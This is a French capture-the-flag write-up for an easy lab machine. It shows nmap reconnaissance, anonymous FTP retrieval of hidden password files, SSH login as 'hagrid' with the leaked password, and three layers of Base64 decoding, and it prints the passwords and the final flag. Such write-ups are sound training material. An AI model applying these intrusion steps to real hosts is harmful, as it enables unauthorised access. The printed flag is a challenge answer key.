# Write-up : "Yer a Wizard, Harry!"

**Cible :** 10.10.0.23
**Difficulté :** Easy
**Objectif :** Obtenir user.txt
**Techniques utilisées :** Reconnaissance réseau, exploitation FTP anonyme, réutilisation de credentials, décodage Base64 imbriqué
**Outils utilisés :** nmap, ftp, ssh, base64

---

## 1. Reconnaissance réseau (Nmap)

**Commande :**

```bash
nmap -sC -sV -p- -T4 10.10.0.23
```

**Pourquoi :** première étape systématique de tout pentest/CTF — identifier les services exposés sur la machine cible pour savoir par où entrer.

**Résultat :** 2 ports ouverts

- `21/tcp` : FTP (vsftpd 3.0.5)
- `22/tcp` : SSH (OpenSSH 10.0p2)

---

## 2. Exploitation du FTP anonyme

**Faille exploitée :** Accès FTP anonyme non restreint (CWE-284 : Improper Access Control) — mauvaise configuration de service permettant l'authentification anonyme sur un service qui devrait être protégé.

```bash
ftp 10.10.0.23
```

Puis dans la session ftp :

```
Name: anonymous
Password: [vide, juste Entrée]
ls -la
get .hidden
cd ...
ls -la
get .reallyHidden
quit
```

**Pourquoi ça a marché :** le serveur FTP acceptait les connexions avec le login `anonymous` sans mot de passe valide requis — mauvaise pratique de configuration très courante en CTF (et parfois en prod).

**Fichiers trouvés :**

- `.hidden` → premier mot de passe (ne fonctionnait pas)
- Dossier caché `...` → contenait `.reallyHidden` avec le bon mot de passe

---

## 3. Lecture des fichiers récupérés

```bash
cat .hidden
# → "Il0veTheMalefoys" (mot de passe qui ne fonctionnait pas)

cat .reallyHidden
# → "IAlreadySaidTooMuch" (bon mot de passe)
```

---

## 4. Authentification SSH par mot de passe faible

**Faille exploitée :** Credentials faibles / exposés (CWE-798 : Use of Hard-coded Credentials) — fuite d'identifiants via un service mal sécurisé, puis réutilisation sur un autre service.

```bash
ssh hagrid@10.10.0.23
```

Réponses aux prompts :

```
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
hagrid@10.10.0.23's password: IAlreadySaidTooMuch
```

**Pourquoi ça a marché :** le mot de passe trouvé via FTP (`IAlreadySaidTooMuch`) correspondait au compte SSH `hagrid` — chaîne d'exploitation classique où une faiblesse sur un service (FTP) permet de rebondir sur un autre (SSH), via réutilisation d'informations découvertes plutôt qu'un exploit technique.

---

## 5. Exploration post-connexion

```bash
ls -la
find / -name "user.txt" 2>/dev/null
cat user.txt
```

**Éléments repérés dans le home de `hagrid` :**

- `user.txt` → le flag recherché (encodé)
- `riddle.txt` avec permissions `----------` (illisible, potentiel indice pour l'escalade de privilèges)
- Dossier `.ssh` avec groupe `headmaster` (suspect, probable piste pour la suite)
- Dossier `hut`

---

## 6. Décodage du flag (obfuscation Base64 imbriquée)

> Note : ce n'est pas une faille de sécurité, mais une technique d'obfuscation (encodage Base64 en plusieurs couches successives), un choix classique de game design en CTF.

**Couche 1 :**

```bash
echo "VWxaQ1NtVjZRblZOTVRseVdWVTFabUpxVGpKTk1VcG1ZVWRHVjAweE9IcGlha0pXVDFWb1prNVVRa1JUZWtvNVEyYzlQUT09" | base64 -d
# → UlZCSmV6QnVNMTlyWVU1ZmJqTjJNMUpmYUdGV00xOHpiakJWT1VoZk5UQkRTeko5Q2c9PQ==
```

**Couche 2 :**

```bash
echo "UlZCSmV6QnVNMTlyWVU1ZmJqTjJNMUpmYUdGV00xOHpiakJWT1VoZk5UQkRTeko5Q2c9PQ==" | base64 -d
# → RVBJezBuM19rYU5fbjN2M1JfaGFWM18zbjBVOUhfNTBDSzJ9Cg==
```

**Couche 3 (finale) :**

```bash
echo "RVBJezBuM19rYU5fbjN2M1JfaGFWM18zbjBVOUhfNTBDSzJ9Cg==" | base64 -d
```

**FLAG obtenu :**

```
EPI{0n3_kaN_n3v3R_haV3_3n0U9H_50CK2}
```

---

## Résumé des failles exploitées

| #   | Faille                                               | Type / Catégorie                                    |
| --- | ---------------------------------------------------- | --------------------------------------------------- |
| 1   | FTP anonyme activé                                   | Mauvaise configuration / contrôle d'accès (CWE-284) |
| 2   | Mots de passe en clair dans des fichiers accessibles | Exposition d'identifiants                           |
| 3   | Mot de passe faible réutilisé pour SSH               | Credentials faibles / réutilisation (CWE-798)       |

---

## Conclusion

- **Accès initial :** exploitation du FTP anonyme → récupération de deux fichiers cachés contenant des mots de passe.
- **Pivot :** réutilisation du mot de passe FTP pour l'authentification SSH en tant que `hagrid`.
- **Flag user :** `EPI{0n3_kaN_n3v3R_haV3_3n0U9H_50CK2}` obtenu après décodage de trois couches de Base64 successives dans `user.txt`.
